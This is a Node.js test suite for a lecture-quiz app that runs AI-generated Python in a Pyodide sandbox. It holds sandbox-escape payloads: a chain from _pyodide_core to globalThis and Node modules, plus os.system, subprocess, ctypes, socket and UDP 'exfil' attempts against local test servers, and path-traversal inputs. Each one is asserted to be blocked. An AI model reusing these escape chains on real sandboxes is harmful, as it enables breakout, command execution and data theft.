import test from 'node:test';
import assert from 'node:assert/strict';
import {mkdtemp,rm,mkdir,writeFile} from 'node:fs/promises';
import {existsSync} from 'node:fs';
import {spawnSync} from 'node:child_process';
import net from 'node:net';
import dgram from 'node:dgram';
import os from 'node:os';
import path from 'node:path';
import {LearningStore} from '../learning.mjs';
import {LearningSources} from '../learning-sources.mjs';
import {LearningQuiz,transcriptWindow,windowHash,verifyTranscriptQuote,verifyRepoQuote,parseQuiz,reviewDays,segmentsFor,executeItem} from '../learning-quiz.mjs';
import {runPython,runnerArgs} from '../python-runner.mjs';
import {createMockChatProvider} from '../chat-mock.mjs';
import {createServer} from '../http-server.mjs';
import {LectureLibrary} from '../library.mjs';
import {atomicJSON} from '../vault.mjs';

const cues=[
  {start:0,end:6,en:'Today we are going to talk about what computation is.'},
  {start:6,end:12,en:'A computer does two things: it calculates and it remembers.'},
  {start:600,end:606,en:'Declarative knowledge is a statement of fact.'},
  {start:606,end:615,en:'Imperative knowledge is a recipe, or how-to.'},
];
const translations={0:{ko:'오늘은 계산이 무엇인지 이야기하겠습니다.'},1:{ko:'컴퓨터는 두 가지를 합니다.'}};
const segment={id:'s0',start:0,end:600};
async function dir(t,prefix){const value=await mkdtemp(path.join(os.tmpdir(),prefix));t.after(()=>rm(value,{recursive:true,force:true,maxRetries:5,retryDelay:100}));return value;}
async function fixture(t,{connected=true,fetcher,run}={}){
  const root=await dir(t,'duvi-quiz-'),repo=await dir(t,'duvi-quiz-repo-');
  await mkdir(path.join(repo,'src'),{recursive:true});await mkdir(path.join(repo,'PROJECT_WIKI'),{recursive:true});
  await writeFile(path.join(repo,'src','model.py'),'import math\n\ndef clamp_log_variance(value):\n    return max(-10.0, min(10.0, value))\n');
  await writeFile(path.join(repo,'PROJECT_WIKI','NOW.md'),'# Now\n\nThe next experiment compares two hypotheses.\n');
  const store=new LearningStore({root}),sources=new LearningSources({root});await sources.set({repos:[{path:repo}]});
  const source={lecture:{number:1,title:'Lecture 1'},cues:structuredClone(cues),translations:structuredClone(translations),alignmentRevision:'align-1'};
  const provider=createMockChatProvider({delayMs:0});
  const quiz=new LearningQuiz({root,store,sources,auth:connected?provider.auth:{state:{activeId:null}},fetcher:fetcher||provider.fetcher,source:async()=>source,mock:true,...(run&&{run})});
  return {root,repo,store,sources,quiz,source,label:path.basename(repo)};
}

test('a transcript quote verifies only when it is verbatim in its own window and its time is inside the window',()=>{
  const rows=transcriptWindow(cues,translations,segment);
  const item=(quote,ref='00:06')=>({quote,source:{kind:'transcript',ref}});
  assert.equal(verifyTranscriptQuote(item('it calculates and it remembers.'),rows,segment),true);
  assert.equal(verifyTranscriptQuote(item('what  computation\nis. A computer does'),rows,segment),true,'whitespace differences and cue boundaries are allowed');
  assert.equal(verifyTranscriptQuote(item('컴퓨터는 두 가지를 합니다.'),rows,segment),true,'the aligned Korean line also counts');
  assert.equal(verifyTranscriptQuote(item('it computes and it remembers.'),rows,segment),false,'one changed word fails');
  assert.equal(verifyTranscriptQuote(item('Declarative knowledge is a statement of fact.'),rows,segment),false,'a quote from another window fails');
  assert.equal(verifyTranscriptQuote(item('it calculates and it remembers.','12:00'),rows,segment),false,'a time outside the window fails');
  assert.equal(verifyTranscriptQuote(item('it'),rows,segment),false,'a trivially short quote fails');
});

test('a repository quote verifies against the cited lines as read from the file, and only for an excerpt that was sent',async t=>{
  const {sources,label}=await fixture(t),excerpt=await sources.excerpt({repo:label,path:'src/model.py',startLine:1,endLine:4});
  const item=(quote,ref='src/model.py:3-4',repo=label)=>({quote,source:{kind:'repo',ref,repo}});
  assert.equal(await verifyRepoQuote(item('return max(-10.0, min(10.0, value))'),[excerpt],sources),true);
  assert.equal(await verifyRepoQuote(item('return max(-5.0, min(5.0, value))'),[excerpt],sources),false);
  assert.equal(await verifyRepoQuote(item('return max(-10.0, min(10.0, value))','src/model.py:1-2'),[excerpt],sources),false,'the quote must be inside the cited lines');
  assert.equal(await verifyRepoQuote(item('return max(-10.0, min(10.0, value))','src/other.py:3-4'),[excerpt],sources),false,'an unsent file never verifies');
  for(const relative of ['../outside.txt','.git/config','C:/Windows/win.ini'])await assert.rejects(sources.excerpt({repo:label,path:relative,startLine:1,endLine:2}),{code:'invalid_learning'});
});

test('model output is validated: malformed items and option answers outside the options are dropped, never repaired',()=>{
  const good={type:'predict',prompt:'p',options:['a','b'],answer:'a',source:{kind:'transcript',ref:'00:01'},quote:'',concepts:[]};
  const {items,dropped}=parseQuiz('```json\n'+JSON.stringify({items:[good,{...good,answer:'c'},{...good,type:'execute'},{...good,extra:1}]})+'\n```');
  assert.deepEqual(items,[good]);assert.equal(dropped,3);
  assert.throws(()=>parseQuiz('not json'),{code:'invalid_quiz'});assert.throws(()=>parseQuiz('{"items":[]}'),{code:'invalid_quiz'});
});

test('mock generation goes through preview and the Responses path; only verbatim quotes and real runs become verified',async t=>{
  const {quiz,label}=await fixture(t);
  const preview=await quiz.preview({lectureId:'1',segmentId:'s0',excerpts:[{repo:label,path:'src/model.py',startLine:3,endLine:4}],concepts:['연산']});
  assert.deepEqual(preview.payload.transcript.map(row=>row.at),['00:00','00:06']);assert.equal(preview.payload.transcript[0].ko,translations[0].ko);
  assert.equal(preview.payload.excerpts[0].ref,'src/model.py:3-4');
  const status=await quiz.generate({token:preview.token,model:'duvi-mock-tutor'}),set=status.segments[0].set;
  assert.deepEqual(set.items.map(row=>[row.type,row.evidence]),[['recall','source_quoted'],['predict','ai_unverified'],['discriminate','source_quoted'],['predict','executed'],['withhold','ai_unverified'],['recall','source_quoted']]);
  assert.equal(set.stale,false);assert.equal(set.mock,true);assert.deepEqual(set.counts,{executed:1,source_quoted:3,learner_confirmed:0,ai_unverified:2,retired:0});
  const executed=set.items[3];
  assert.equal(executed.answer,'3.5\n3','the real output replaces the AI expected answer');
  assert.deepEqual(executed.execution,{status:'executed',output:'3.5\n3',aiAnswer:'3.5\n3.5',mismatch:true,truncated:false});
  assert.equal(status.segments[1].set,undefined);
  await assert.rejects(quiz.generate({token:preview.token,model:'duvi-mock-tutor'}),{code:'invalid_preview'},'a used token cannot generate twice');
});

test('questions go stale when the captions or the alignment change, and a caption change during generation is refused',async t=>{
  const {quiz,source}=await fixture(t);
  await quiz.generate({token:(await quiz.preview({lectureId:'1',segmentId:'s0'})).token,model:'duvi-mock-tutor'});
  source.cues[1]={...source.cues[1],en:'A computer does two things.'};
  assert.equal((await quiz.status('1')).segments[0].set.stale,true);
  source.cues=structuredClone(cues);assert.equal((await quiz.status('1')).segments[0].set.stale,false);
  source.alignmentRevision='align-2';assert.equal((await quiz.status('1')).segments[0].set.stale,true);
  const preview=await quiz.preview({lectureId:'1',segmentId:'s0'});source.cues[0]={...source.cues[0],en:'Changed.'};
  await assert.rejects(quiz.generate({token:preview.token,model:'duvi-mock-tutor'}),{code:'source_changed'});
  assert.equal(windowHash(transcriptWindow(cues,{},segment)),windowHash(transcriptWindow(cues,translations,segment)),'Korean retranslation alone does not stale English quotes');
});

test('failure keeps the preview token for a retry; no connection is reported as connection needed',async t=>{
  const {quiz}=await fixture(t);
  const failing=await quiz.preview({lectureId:'1',segmentId:'s0',concepts:['#실패']});
  await assert.rejects(quiz.generate({token:failing.token,model:'duvi-mock-tutor'}),{code:'subscription_sharing_usage_limit_exceeded'});
  assert.equal(quiz.tokens.has(failing.token),true);assert.equal(quiz.active.size,0);
  const offline=await fixture(t,{connected:false}),preview=await offline.quiz.preview({lectureId:'1',segmentId:'s0'});
  assert.equal(preview.connected,false);await assert.rejects(offline.quiz.generate({token:preview.token,model:'x'}),{code:'not_connected'});
});

test('cancel aborts an in-flight generation and the input stays usable',async t=>{
  let release;const started=new Promise(resolve=>{release=resolve;});
  const fetcher=(url,init)=>new Promise((resolve,reject)=>{release();init.signal.addEventListener('abort',()=>reject(init.signal.reason),{once:true});});
  const {quiz}=await fixture(t,{fetcher}),preview=await quiz.preview({lectureId:'1',segmentId:'s0'});
  const pending=quiz.generate({token:preview.token,model:'duvi-mock-tutor'});await started;
  assert.equal((await quiz.status('1')).generating,true);assert.deepEqual(quiz.cancel({lectureId:'1'}),{cancelled:true});
  await assert.rejects(pending,{code:'cancelled'});assert.equal(quiz.tokens.has(preview.token),true);assert.equal((await quiz.status('1')).generating,false);
});

test('cancel during code execution stops it and saves nothing, even when the run itself returns afterwards',async t=>{
  const runs=[
    (code,{signal})=>new Promise(resolve=>signal.addEventListener('abort',()=>resolve({status:'cancelled',reason:'실행을 취소했습니다.'}),{once:true})),
    (code,{signal})=>new Promise(resolve=>signal.addEventListener('abort',()=>resolve({status:'executed',output:'3.5\n3\n',error:null,truncated:false}),{once:true})),
  ];
  for(const run of runs){
    let running;const started=new Promise(resolve=>{running=resolve;});
    const {quiz,root}=await fixture(t,{run:(code,options)=>{running();return run(code,options);}}),preview=await quiz.preview({lectureId:'1',segmentId:'s0'});
    const pending=quiz.generate({token:preview.token,model:'duvi-mock-tutor'});await started;
    assert.deepEqual(quiz.cancel({lectureId:'1'}),{cancelled:true});
    await assert.rejects(pending,{code:'cancelled'});
    assert.equal((await quiz.status('1')).segments[0].set,undefined,'nothing of the cancelled generation is saved');
    assert.equal(existsSync(path.join(root,'quizzes','1.json')),false);assert.equal(quiz.tokens.has(preview.token),true);
  }
});

test('attempts snapshot the question, grade options automatically and schedule review 1/3/7 days',async t=>{
  const {quiz,store}=await fixture(t);
  const status=await quiz.generate({token:(await quiz.preview({lectureId:'1',segmentId:'s0'})).token,model:'duvi-mock-tutor'});
  const [recall,predict]=status.segments[0].set.items,day=86400000;
  assert.deepEqual([reviewDays('wrong','high'),reviewDays('wrong','low'),reviewDays('right','low'),reviewDays('right','medium'),reviewDays('right','high')],[1,1,3,3,7]);
  const confidentWrong=await quiz.attempt({lectureId:'1',segmentId:'s0',itemId:predict.id,prediction:'앞의 정의를 반복한다',confidence:'high',result:'right'});
  assert.equal(confidentWrong.attempt.result,'wrong','a learner-sent result never overrides option grading');assert.equal(confidentWrong.attempt.grading,'option');
  assert.equal(Date.parse(confidentWrong.attempt.reviewDueAt)-Date.parse(confidentWrong.attempt.createdAt),day);
  const sure=await quiz.attempt({lectureId:'1',segmentId:'s0',itemId:predict.id,prediction:'예시를 든다',confidence:'high'});
  assert.equal(sure.attempt.result,'right');assert.equal(Date.parse(sure.attempt.reviewDueAt)-Date.parse(sure.attempt.createdAt),7*day);
  const unsure=await quiz.attempt({lectureId:'1',segmentId:'s0',itemId:recall.id,prediction:'계산이 무엇인지',confidence:'low',result:'right'});
  assert.equal(unsure.attempt.grading,'self');assert.equal(Date.parse(unsure.attempt.reviewDueAt)-Date.parse(unsure.attempt.createdAt),3*day);
  assert.equal(unsure.attempt.evidence,'source_quoted');assert.equal(unsure.attempt.item.quote,recall.quote);
  await assert.rejects(quiz.attempt({lectureId:'1',segmentId:'s0',itemId:recall.id,prediction:'x',confidence:'low'}),{code:'invalid_learning'},'a self-graded answer needs the learner result');
  const explained=await quiz.attempt({id:confidentWrong.attempt.id,explanation:'//는 몫만 남긴다'});
  assert.equal(explained.attempt.explanation,'//는 몫만 남긴다');assert.equal(explained.attempt.revision,2);assert.equal(explained.attempt.prediction,'앞의 정의를 반복한다');
  assert.equal((await store.get()).attempts.length,3);
});

test('confirm, retire and restore change only the evidence label; AI answers are never marked verified by the AI',async t=>{
  const {quiz}=await fixture(t);
  const status=await quiz.generate({token:(await quiz.preview({lectureId:'1',segmentId:'s0'})).token,model:'duvi-mock-tutor'});
  const [recall,predict]=status.segments[0].set.items,act=(item,action)=>quiz.item({lectureId:'1',segmentId:'s0',itemId:item.id,action});
  await assert.rejects(act(recall,'confirm'),{code:'invalid_learning'});
  let after=await act(predict,'confirm');assert.equal(after.segments[0].set.items[1].evidence,'learner_confirmed');
  after=await act(recall,'retire');assert.equal(after.segments[0].set.items[0].evidence,'retired');
  await assert.rejects(quiz.attempt({lectureId:'1',segmentId:'s0',itemId:recall.id,prediction:'x',confidence:'low',result:'right'}),{code:'invalid_learning'});
  after=await act(recall,'restore');assert.equal(after.segments[0].set.items[0].evidence,'source_quoted');
});

test('fixed code runs once in Pyodide: bridges to JavaScript are blocked, output is capped and runaway code is killed',async()=>{
  assert.deepEqual(await runPython('print(7 / 2)\nprint(7 // 2)'),{status:'executed',output:'3.5\n3\n',error:null,truncated:false});
  for(const code of ['import js','import pyodide','from pyodide.http import pyfetch','import micropip','import sys\nsys.meta_path.clear()\nimport js']){
    const result=await runPython(code);assert.equal(result.status,'executed');assert.match(result.error,/^(ImportError|ModuleNotFoundError)/,code);
  }
  assert.equal((await runPython('print(1/0)')).error,'ZeroDivisionError: division by zero');
  assert.deepEqual(await runPython('import hashlib, json, re, collections, math, random, itertools, functools, datetime, decimal, fractions, statistics\nprint(json.dumps(sorted({3, 1, 2})), end="")'),
    {status:'executed',output:'[1, 2, 3]',error:null,truncated:false},'stdlib imports and output without a final newline still work after the Pyodide modules are emptied');
  const long=await runPython('print("x" * 100000)',{maxOutput:100});assert.equal(long.output.length,100);assert.equal(long.truncated,true);
  assert.deepEqual(await runPython('while True: pass',{runMs:300}),{status:'timeout',reason:'0.3초 안에 끝나지 않아 멈췄습니다.'});
  const controller=new AbortController(),cancelled=runPython('while True: pass',{runMs:60000,signal:controller.signal});
  setTimeout(()=>controller.abort(),200);
  assert.deepEqual(await cancelled,{status:'cancelled',reason:'실행을 취소했습니다.'},'cancel kills the run long before its own timeout');
});

/**
 * A host temp directory, a local TCP server that counts connections and a local UDP server that keeps every datagram;
 * all cleaned up after the test. datagrams() sends a sentinel to the UDP server and, once it has arrived, returns
 * what came before it, so a datagram the runner sent before it exited cannot arrive after the check.
 */
async function host(t){
  const directory=await dir(t,'duvi-runner-host-'),connections=[],received=[];
  const server=net.createServer(socket=>{connections.push(socket.remoteAddress);socket.destroy();});
  await new Promise(resolve=>server.listen(0,'127.0.0.1',resolve));t.after(()=>new Promise(resolve=>server.close(resolve)));
  const udp=dgram.createSocket('udp4');udp.on('message',message=>received.push(message.toString('latin1')));
  await new Promise(resolve=>udp.bind(0,'127.0.0.1',resolve));t.after(()=>new Promise(resolve=>udp.close(resolve)));
  const datagrams=async()=>{
    const sentinel=`sentinel-${received.length}`,arrived=new Promise(resolve=>udp.on('message',message=>{if(message.toString()===sentinel)resolve();}));
    udp.send(sentinel,udp.address().port,'127.0.0.1');await arrived;return received.filter(row=>!row.startsWith('sentinel-'));
  };
  return {connections,port:server.address().port,udpPort:udp.address().port,datagrams,file:name=>path.join(directory,name)};
}
const py=value=>JSON.stringify(value);

test('generated code cannot start a host process, write a host file or open a connection',async t=>{
  const {connections,port,file}=await host(t);
  const cases=[
    ['os.system',`import os\nos.system(${py(`echo RAN> "${file('system.txt')}"`)})`,'system.txt',/^AttributeError/],
    ['posix.system',`import posix\nposix.system(${py(`echo RAN> "${file('posix.txt')}"`)})`,'posix.txt',/^AttributeError/],
    ['os.popen',`import os\nos.popen(${py(`echo RAN> "${file('popen.txt')}"`)})`,'popen.txt',/^AttributeError/],
    ['subprocess',`import subprocess\nsubprocess.run(['cmd','/c','echo x'])`,null,/^ImportError/],
    ['ctypes','import ctypes',null,/^ImportError/],
    ['socket',`import socket\nsocket.create_connection(('127.0.0.1',${port}),timeout=1)`,null,/^ImportError/],
    ['urllib',`import urllib.request\nurllib.request.urlopen('http://127.0.0.1:${port}/',timeout=1)`,null,/Error/],
  ];
  for(const [name,code,created,error] of cases){
    const result=await runPython(code);
    assert.equal(result.status,'executed',name);assert.match(result.error||'',error,name);
    if(created)assert.equal(existsSync(file(created)),false,`${name} must not create a host file`);
  }
  // Python's open() writes to Pyodide's in-memory file system, never to the host path.
  const target=file('open.txt');
  const opened=await runPython(`import os\nos.makedirs(${py(path.dirname(target))}, exist_ok=True)\nwith open(${py(target)}, 'w') as f:\n    f.write('RAN')\nprint(os.path.exists(${py(target)}))`);
  assert.deepEqual([opened.status,opened.error,opened.output],['executed',null,'True\n']);
  assert.equal(existsSync(target),false,'open() must not create a host file');
  assert.deepEqual(connections,[],'no connection reached the local server');
});

test('below the Python guard the process still fails closed: child_process and the network throw in JavaScript',async t=>{
  const {connections,port,file}=await host(t);
  const system=await runPython(`import os\nprint('rc', os.system(${py(`echo RAN> "${file('system.txt')}"`)}))`,{pythonGuard:false});
  assert.equal(system.status,'executed');assert.match(system.error,/child_process\.spawnSync/);assert.doesNotMatch(system.output,/rc 0/);
  assert.equal(existsSync(file('system.txt')),false);
  for(const code of [`import socket\nsocket.create_connection(('127.0.0.1',${port}),timeout=1)`,`import urllib.request\nurllib.request.urlopen('http://127.0.0.1:${port}/',timeout=1)`]){
    const result=await runPython(code,{pythonGuard:false});assert.equal(result.status,'executed');assert.match(result.error,/Error/,code);
  }
  assert.deepEqual(connections,[]);
});

// The re-review's escape: a Pyodide module object → create_proxy → Function('return globalThis') → Node APIs, with
// process.send/exit replaced so the run is only stopped at its timeout and queued sends get out. The module comes from gc
// (the re-review's route) or is created again as a builtin, which emptying the modules cannot prevent.
const CORE={
  gc:"import gc\ncore = next(o for o in gc.get_objects() if type(o).__name__ == 'module' and getattr(o, '__name__', '') == '_pyodide_core')",
  builtin:"import importlib._bootstrap as b\ncore = b._builtin_from_name('_pyodide_core')",
};
const reviewerEscape=({route,udpPort,port,target})=>`${CORE[route]}
g = core.create_proxy(lambda: 1).constructor.constructor('return globalThis')()
get = g.process.getBuiltinModule
def attempt(action):
    try:
        action()
    except Exception:
        pass
def query():
    resolver = get('dns').Resolver.new()
    resolver.setServers(g.JSON.parse('["127.0.0.1:${udpPort}"]'))
    resolver.resolve4('duvi-test.invalid', core.create_proxy(lambda *args: None))
attempt(lambda: get('dgram').Socket.new('udp4').send('exfil-udp', ${udpPort}, '127.0.0.1'))
attempt(query)
attempt(lambda: get('net').Socket.new().connect(${port}, '127.0.0.1'))
attempt(lambda: get('child_process').spawnSync('cmd', ['/c', ${py(`echo RAN> "${target}"`)}]))
attempt(lambda: get('fs').writeFileSync(${py(target)}, 'RAN'))
g.process.send = g.process.exit = core.create_proxy(lambda *args: None)`;

test('the re-review escape sends no datagram, DNS query or connection: gc has no Pyodide module, and Function(string) is refused',async t=>{
  const {connections,port,udpPort,datagrams,file}=await host(t);
  for(const [route,error] of [['gc',/^StopIteration$/],['builtin',/EvalError: Code generation from strings disallowed/]]){
    const target=file(`escape-${route}.txt`),result=await runPython(reviewerEscape({route,udpPort,port,target}),{runMs:2000});
    assert.deepEqual(await datagrams(),[],`${route}: no UDP datagram and no DNS query reached the local server`);
    assert.deepEqual(connections,[]);assert.equal(existsSync(target),false);
    assert.equal(result.status,'executed',route);assert.match(result.error,error,route);
  }
});

test('with JavaScript reached, every network, process, file, worker, inspector, vm and binding path throws',async t=>{
  const {connections,port,udpPort,datagrams,file}=await host(t),target=file('reached.txt'),url=`http://127.0.0.1:${port}/`;
  // Without the Python layer \`import js\` is globalThis; code that cannot import js falls back to the re-review's path.
  const code=`import json, gc
try:
    import js as g
except ImportError:
    core = next(o for o in gc.get_objects() if type(o).__name__ == 'module' and getattr(o, '__name__', '') == '_pyodide_core')
    g = core.create_proxy(lambda: 1).constructor.constructor('return globalThis')()
get = g.process.getBuiltinModule
options = g.JSON.parse
def resolver(module, callback):
    r = module.Resolver.new()
    r.setServers(options('["127.0.0.1:${udpPort}"]'))
    r.resolve4('duvi-test.invalid', *callback)
def restore():
    dgram = get('dgram')
    try:
        dgram.createSocket = get('net').isIP
    except Exception:
        pass
    dgram.createSocket('udp4').send('restored', ${udpPort}, '127.0.0.1')
cases = {
    'dgram.Socket': lambda: get('dgram').Socket.new('udp4').send('exfil-udp', ${udpPort}, '127.0.0.1'),
    'dgram.createSocket': lambda: get('dgram').createSocket('udp4').send('exfil-udp', ${udpPort}, '127.0.0.1'),
    'dgram restore': restore,
    'dns.Resolver': lambda: resolver(get('dns'), [lambda *args: None]),
    'dns.promises.Resolver': lambda: resolver(get('dns').promises, []),
    'dns.lookup': lambda: get('dns').lookup('localhost', lambda *args: None),
    'net.Socket': lambda: get('net').Socket.new().connect(${port}, '127.0.0.1'),
    'net.connect': lambda: get('net').connect(${port}, '127.0.0.1'),
    'net.Server.listen': lambda: get('net').Server.new().listen(0),
    'http.request': lambda: get('http').request('${url}').end(),
    'http.ClientRequest': lambda: get('http').ClientRequest.new('${url}'),
    'http.Agent': lambda: get('http').Agent.new().createConnection(options('{"port":${port},"host":"127.0.0.1"}')),
    'tls.connect': lambda: get('tls').connect(${port}, '127.0.0.1'),
    'http2.connect': lambda: get('http2').connect('${url}'),
    'fetch': lambda: g.fetch('${url}'),
    'WebSocket': lambda: g.WebSocket.new('ws://127.0.0.1:${port}/'),
    'child_process': lambda: get('child_process').spawnSync('cmd', ['/c', ${py(`echo RAN> "${target}"`)}]),
    'fs.writeFileSync': lambda: get('fs').writeFileSync(${py(target)}, 'RAN'),
    'worker_threads': lambda: get('worker_threads').Worker.new('1', options('{"eval":true}')),
    'inspector.open': lambda: get('inspector').open(0),
    'inspector.Session': lambda: get('inspector').Session.new().connect(),
    'vm': lambda: get('vm').runInThisContext('1'),
    'wasi': lambda: get('wasi').WASI.new(options('{"version":"preview1"}')),
    'Function': lambda: g.Function('return 1'),
    'process.binding': lambda: g.process.binding('udp_wrap'),
    'process._linkedBinding': lambda: g.process._linkedBinding('udp_wrap'),
    'process.kill': lambda: g.process.kill(g.process.ppid, 0),
}
results = {}
for name, action in cases.items():
    try:
        action()
        results[name] = 'allowed'
    except Exception:
        results[name] = 'blocked'
print(json.dumps(results))`;
  const result=await runPython(code,{pythonGuard:false,runMs:10000});
  assert.equal(result.status,'executed',result.reason);assert.equal(result.error,null);
  const results=JSON.parse(result.output);
  assert.deepEqual(Object.entries(results).filter(([,value])=>value!=='blocked'),[],'nothing is allowed');
  assert.equal(Object.keys(results).length,27);
  assert.deepEqual(await datagrams(),[]);assert.deepEqual(connections,[]);assert.equal(existsSync(target),false);
});

test('the re-review bypasses of the Python layer still start no process and write no host file',async t=>{
  const {file}=await host(t),command=name=>py(`echo RAN> "${file(name)}"`);
  const cases=[
    ['_builtin_from_name posix',`import importlib._bootstrap as b\nb._builtin_from_name('posix').system(${command('posix.txt')})`,'posix.txt'],
    ['meta_path removed, subprocess',`import sys\nsys.meta_path.pop(0)\nimport subprocess\nsubprocess.run(['cmd', '/c', ${command('subprocess.txt')}])`,'subprocess.txt'],
    ['meta_path removed, ctypes system',`import sys\nsys.meta_path.pop(0)\nimport ctypes\nctypes.CDLL(None).system(${command('ctypes.txt')}.encode())`,'ctypes.txt'],
  ];
  for(const [name,code,created] of cases){
    const result=await runPython(code);
    assert.equal(result.status,'executed',name);assert.ok(result.error,`${name} fails`);
    assert.equal(existsSync(file(created)),false,`${name} must not create a host file`);
  }
});

test('the runner process flags grant no file write, process, worker or read outside the Pyodide package',async t=>{
  const {file}=await host(t),outside=file('secret.txt');await writeFile(outside,'secret');
  const probe=`
    const fs=await import('node:fs'),cp=await import('node:child_process'),{Worker}=await import('node:worker_threads');
    const codes={};const attempt=(name,run)=>{try{run();codes[name]='allowed';}catch(error){codes[name]=error.code;}};
    attempt('write',()=>fs.writeFileSync(${py(file('written.txt'))},'x'));
    attempt('read',()=>fs.readFileSync(${py(outside)}));
    attempt('spawn',()=>cp.spawnSync('cmd',['/c','echo x']));
    attempt('worker',()=>new Worker('1',{eval:true}));
    console.log(JSON.stringify(codes));`;
  const result=spawnSync(process.execPath,[...runnerArgs(),'--input-type=module','-e',probe],{encoding:'utf8',env:{},timeout:30000});
  assert.deepEqual(JSON.parse(result.stdout),{write:'ERR_ACCESS_DENIED',read:'ERR_ACCESS_DENIED',spawn:'ERR_ACCESS_DENIED',worker:'ERR_ACCESS_DENIED'});
  assert.equal(existsSync(file('written.txt')),false);
  assert.deepEqual(runnerArgs().filter(flag=>flag.startsWith('--allow')).map(flag=>flag.split('=')[0]),['--allow-fs-read'],'the only grant is reading the Pyodide package');
});

test('a run that does not match any option keeps the real output; a failed run leaves the answer unverified with its reason',async t=>{
  const item={type:'predict',prompt:'p',code:'print(2 ** 3)',options:['6','9'],answer:'6',source:{kind:'transcript',ref:'00:01'},quote:'',concepts:[]};
  const ran=await executeItem(item,async()=>({status:'executed',output:'8\n',error:null,truncated:false}));
  assert.equal(ran.item.answer,'8');assert.equal(ran.item.options,undefined);assert.equal(ran.execution.optionsDropped,true);assert.equal(ran.execution.mismatch,true);
  for(const failure of [{status:'timeout',reason:'3초 안에 끝나지 않아 멈췄습니다.'},{status:'unavailable',reason:'Python 실행 환경(Pyodide)을 불러오지 못했습니다: test'}]){
    const {quiz}=await fixture(t,{run:async()=>failure});
    const set=(await quiz.generate({token:(await quiz.preview({lectureId:'1',segmentId:'s0'})).token,model:'duvi-mock-tutor'})).segments[0].set,coded=set.items[3];
    assert.equal(coded.evidence,'ai_unverified');assert.equal(coded.answer,'3.5\n3.5');assert.deepEqual(coded.execution,failure);
  }
});

test('learner answers never reach the runner: only the generated question code runs, once, at generation',async t=>{
  const runs=[],{quiz}=await fixture(t,{run:async code=>{runs.push(code);return {status:'executed',output:'3.5\n3\n',error:null,truncated:false};}});
  const set=(await quiz.generate({token:(await quiz.preview({lectureId:'1',segmentId:'s0'})).token,model:'duvi-mock-tutor'})).segments[0].set;
  assert.deepEqual(runs,['print(7 / 2)\nprint(7 // 2)']);
  const recall=set.items[0],coded=set.items[3];
  await quiz.attempt({lectureId:'1',segmentId:'s0',itemId:recall.id,prediction:'import os\nprint(os.listdir("/"))',confidence:'low',result:'wrong'});
  const saved=await quiz.attempt({lectureId:'1',segmentId:'s0',itemId:coded.id,prediction:'3.5\n3',confidence:'high'});
  await quiz.attempt({id:saved.attempt.id,explanation:'print("learner code")'});
  assert.deepEqual(runs,['print(7 / 2)\nprint(7 // 2)']);assert.equal(saved.attempt.result,'right');assert.equal(saved.attempt.evidence,'executed');assert.equal(saved.attempt.item.code,coded.code);
});

test('segments are ten-minute windows and the quiz routes are registered behind the CSRF gate',async t=>{
  assert.deepEqual(segmentsFor(cues).map(row=>[row.id,row.start,row.end]),[['s0',0,600],['s600',600,615]]);
  const root=await dir(t,'duvi-quiz-http-');
  await atomicJSON(path.join(root,'data/catalog.json'),[{number:1}]);await atomicJSON(path.join(root,'data/1.json'),{number:1,title:'Lecture',videoUrl:'https://ocw.mit.edu/fixture.mp4',cues});
  const port=6189,base=`http://127.0.0.1:${port}`,server=createServer({root,library:new LectureLibrary({root}),auth:{state:{activeId:null},publicState:()=>({accounts:[]})},translations:{publicJob:()=>null},port,chatProvider:createMockChatProvider({delayMs:0})});
  await new Promise(resolve=>server.listen(port,'127.0.0.1',resolve));t.after(()=>new Promise(resolve=>server.close(resolve)));
  const session=await fetch(base+'/api/session'),cookie=session.headers.get('set-cookie').split(';')[0],{csrf}=await session.json();
  const headers={Cookie:cookie,Origin:base,'Content-Type':'application/json','X-CSRF-Token':csrf};
  const post=(route,body,extra={})=>fetch(base+route,{method:'POST',headers:{...headers,...extra},body:JSON.stringify(body)});
  for(const route of ['/api/learning/quiz/preview','/api/learning/quiz/generate','/api/learning/quiz/attempt','/api/learning/quiz/item','/api/learning/quiz/cancel','/api/learning/sources'])assert.equal((await post(route,{},{'X-CSRF-Token':'wrong'})).status,403);
  const preview=await (await post('/api/learning/quiz/preview',{lectureId:'1',segmentId:'s0'})).json();
  const generated=await post('/api/learning/quiz/generate',{token:preview.token,model:'duvi-mock-tutor'});assert.equal(generated.status,200);
  const status=await (await fetch(base+'/api/learning/quizzes/1',{headers})).json();assert.equal(status.mock,true);assert.equal(status.segments[0].set.items.length,5);
  const list=await (await fetch(base+'/api/learning/quizzes',{headers})).json();assert.deepEqual(list.sets.map(row=>[row.lectureId,row.items]),[['1',5]]);
  const item=status.segments[0].set.items[1],attempt=await post('/api/learning/quiz/attempt',{lectureId:'1',segmentId:'s0',itemId:item.id,prediction:item.answer,confidence:'medium'});
  assert.equal((await attempt.json()).attempt.result,'right');
  assert.equal((await fetch(base+'/api/learning/evidence',{headers}).then(res=>res.json())).message,'설정된 저장소 없음');
  assert.equal((await fetch(base+'/quizzes/1.json')).status,404);
});
